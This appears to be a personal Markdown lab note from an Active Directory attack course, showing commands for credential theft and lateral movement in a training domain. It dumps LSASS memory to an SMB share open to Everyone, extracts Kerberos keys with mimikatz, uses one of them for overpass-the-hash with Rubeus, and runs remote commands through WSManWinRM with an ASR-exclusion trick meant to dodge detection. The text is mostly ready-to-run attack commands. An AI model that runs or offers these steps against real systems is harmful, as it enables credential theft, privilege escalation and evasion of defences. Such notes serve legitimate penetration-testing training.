Must have `FindLSASSPID` and `minidumpdotnet` ready first

Create a SMB share thats available to `Everyone`, `Guests` and `Anonymous Logon `
```powershell
net share share=C:\AD\Tools\share /grant:Everyone,Full
```
![[Pasted image 20250521220229.png]]
Run `FindLSASSPID` from share
```powershell
\\DCORP-STD548.dollarcorp.moneycorp.local\share\FindLSASSPID.exe
```

Break execution chain
```powershell

```

Run minidumpdotnet
```powershell
\\DCORP-STD548.dollarcorp.moneycorp.local\share\\minidumpdotnet.exe 708 \\DCORP-STD548.dollarcorp.moneycorp.local\share\monkey1.dmp
```

> **Note:** Since the memory dump is being written to a fileshare, **you may need to wait for up to 10  minutes**. The dump file size will initially be `0KB` but eventually be something approximately `10MB`. 

Break execution chain again
```powershell

```

Extract credentials on host machine
```powershell
.\mimikatz.exe "sekurlsa::minidump C:\AD\Tools\share\monkey1.dmp" "sekurlsa::ekeys" "exit"
```

OPtH
```powershell
.\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:dbadmin /aes256:ef21ff273f16d437948ca755d010d5a1571a5bda62a0a372b29c703ab0777d4f /domain:eu.eurocorp.local /dc:eu-dc.eu.eurocorp.local /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

To avoid detection, we can use the `WSManWinRM.exe` tool. We will append an `ASR` exclusion such as  `C:\Windows\ccmcache\` to avoid detections from the "Block process creations originating from `PSExec` and `WMI` commands" `ASR` rule. Run the below command from the process spawned as `dbadmin`:

> **Note:** if the tool returns a value of 0, there is an error with command execution.

We can see the command output by piping it to a file on a our share
```powershell
WSManWinRM.exe eu-sqlx.eu.eurocorp.local "cmd /c dir >> \\DCORP-STD548.dollarcorp.moneycorp.local\share\out.txt C:\Windows\ccmcache\"
```